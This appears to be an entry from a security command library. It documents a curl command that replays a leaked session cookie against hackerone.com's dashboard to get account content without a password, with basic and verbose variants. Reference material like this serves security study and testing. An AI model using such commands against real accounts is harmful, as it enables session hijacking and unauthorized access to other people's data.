---
data: >-
  curl -H "Cookie: __session=leaked_cookie_value_here"
  https://hackerone.com/dashboard
tags:
  - http
  - authentication
  - session
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.549Z'
id: 9e48b241-aa27-4c47-8df8-790752700b00
verified: false
validated: true
submitted: true
---
# curl-reuse-session-cookie

## Command

```bash
curl -H "Cookie: __session=leaked_cookie_value_here" https://hackerone.com/dashboard
```

## Description

This command sends an HTTP request to a protected endpoint using a leaked session cookie in the headers, attempting to authenticate and retrieve account-specific content without a password.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: ..."` | Sets the session cookie header with the leaked value | Yes |
| `https://hackerone.com/dashboard` | Target authenticated URL | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: __session=abc123def456" https://hackerone.com/
```

### Advanced Usage

```bash
curl -H "Cookie: __session=abc123def456" -v https://hackerone.com/dashboard > response.html
```

## Expected Output

Successful response: HTTP 200 with HTML or JSON containing dashboard elements, user info, or redirects to authenticated pages. Failure: 401 Unauthorized or cookie invalidation.

## Related

- [[Related Procedure: Reuse-Session-Cookie-for-Authentication]]
